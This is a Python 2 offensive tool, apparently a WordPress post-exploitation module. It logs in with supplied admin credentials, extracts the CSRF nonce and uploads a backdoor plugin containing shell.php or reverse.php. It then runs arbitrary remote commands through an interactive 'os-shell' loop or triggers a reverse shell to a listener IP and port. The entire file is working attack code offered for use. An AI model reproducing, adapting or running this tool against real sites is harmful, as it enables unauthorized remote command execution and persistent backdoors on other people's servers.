import sys
import requests
import argparse
from random import choice
from string import ascii_lowercase
__author__ = 'Esteban Rodriguez (n00py)'


def uploadbackdoor(host,username,password,type):
    url = host + '/wp-login.php'
    headers = {'user-agent': 'n00py Auto-shell',
               'Accept-Encoding' : 'none'
    }
    payload = {'log': username,
               'pwd': password,
               'rememberme': 'forever',
               'wp-submit': 'log In',
               'redirect_to': host + '/wp-admin/',
               'testcookie': 1,
               }
    windows = False
    linux = False
    uploaddir = (''.join(choice(ascii_lowercase) for i in range(7)))
    session = requests.Session()

    r = session.post(url, headers=headers, data=payload)
    print "Server Header: " + r.headers['Server']
    if ("IIS" or "Microsoft") not in r.headers:
        print "Probably a Linux server"
        linux = True
    else:
        print "Probably a Windows server"
        windows = True
    if r.status_code == 200:
        print "Found Login Page"
    r3 = session.get(host + '/wp-admin/plugin-install.php?tab=upload',headers=headers)
    if r3.status_code == 200:
        print "Logged in as Admin"
    look_for = 'name="_wpnonce" value="'
    try:
        nonceText = r3.text.split(look_for, 1)[1]
        nonce = nonceText[0:10]
        print "Found CSRF Token: " + nonce
    except:
        print "Didn't find nonce"

    files = {'pluginzip': (uploaddir + '.zip', open(type +'.zip', 'rb')),
             '_wpnonce': (None, nonce),
             '_wp_http_referer': (None, host + '/wp-admin/plugin-install.php?tab=upload'),
             'install-plugin-submit': (None,'Install Now')

             }
    r4 = session.post(host + "/wp-admin/update.php?action=upload-plugin",headers=headers, files=files)
    if r.status_code == 200:
        print "Backdoor uploaded!"
        if "Plugin installed successfully" in r4.text:
            print "Plugin installed successfully"

        if "Destination folder already exists" in r4.text:
            print "Destination folder already exists"
    print "Upload Directory: " + uploaddir
    return uploaddir


def testlinux():

    params = [('cmd', 'uname -a')]
    print "Sending command: uname -a"
    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
    print sendcommand.text


def testwindows():

    params = [('cmd', 'ver')]
    print "Sending command: ver"
    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
    print sendcommand.text


def commandloop(host,uploaddir):
    while True:
        cmd = raw_input('os-shell> ')
        params = [('cmd', cmd)]
        if (cmd == "quit") or (cmd == "exit"):
            sys.exit(2)
        if cmd == "help":
            print "Except for the commands 'help', 'exit', and 'quit' the command will be ran on the remote host"
        else:
            print "Sending command: " + cmd
        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
        print sendcommand.text

def reverseshell(host, ip, port,uploaddir):
    params = [('ip', ip), ('port', port)]
    print "Sending reverse shell to " + ip + " port " + port
    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/reverse.php", params=params)


def printbanner():
    banner = """\
       ,-~~-.___.       __        __ ____   _____
      / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___
     (  )        0       \ \ /\ / / | |_) || |_  / _ \ | '__|/ __|/ _ \.
      \_/-, ,----'  ____  \ V  V /  |  __/ |  _|| (_) || |  | (__|  __/
         ====      ||   \_ \_/\_/   |_|    |_|   \___/ |_|   \___|\___|
        /  \-'~;   ||     |
       /  __/~| ...||__/|-"   Post-exploitation Module for Wordpress
     =(  _____||________|                 ~n00py~
    """
    print banner


def argcheck():
    if args.interactive and args.reverse:
        print "-i and -r are mutually exclusive"
        sys.exit()

    if args.interactive is False and args.reverse is False:
        print "You must choose a type of shell: --reverse or --interactive"
        sys.exit()

    if "http" not in args.target:
        print"Please include the protocol in the URL"
        sys.exit()


parser = argparse.ArgumentParser(description='This a post-exploitation module for Wordpress')
parser.add_argument('-i','--interactive', help='Interactive command shell',required=False, action='store_true')
parser.add_argument('-r','--reverse',help='Reverse Shell', required=False, action='store_true')
parser.add_argument('-t','--target',help='URL of target', required=True)
parser.add_argument('-u','--username',help='Admin username', required=True)
parser.add_argument('-p','--password',help='Admin password', required=True)
parser.add_argument('-li','--ip',help='Listener IP', required=False)
parser.add_argument('-lp','--port',help='Listener Port', required=False)
parser.add_argument('-v','--verbose',help=' Verbose output.', required=False, action='store_true')
parser.add_argument('-e','--existing',help=' Skips uploading a shell, and connects to existing shell', required=False)
args = parser.parse_args()
printbanner()
argcheck()
if args.interactive and args.reverse:
    print "-i and -r are mutually exclusive"
    sys.exit()

if args.interactive is False and args.reverse is False:
    print "You must choose a type of shell: --reverse or --interactive"
    sys.exit()

if "http" not in args.target:
    print"Please include the protocol in the URL"
    sys.exit()

if args.interactive:
    if args.existing is None:
        uploaddir = uploadbackdoor(args.target, args.username, args.password, "shell")
    else:
        uploaddir = args.existing
    commandloop(args.target,uploaddir)

if args.reverse:
    if args.ip is None or args.port is None:
        print "For a reverse shell, a listening IP and Port are required"
        sys.exit()
    if args.existing is None:
        uploaddir = uploadbackdoor(args.target, args.username, args.password, "reverse")
    else:
        uploaddir = args.existing
    reverseshell(args.target, args.ip, args.port, uploaddir)

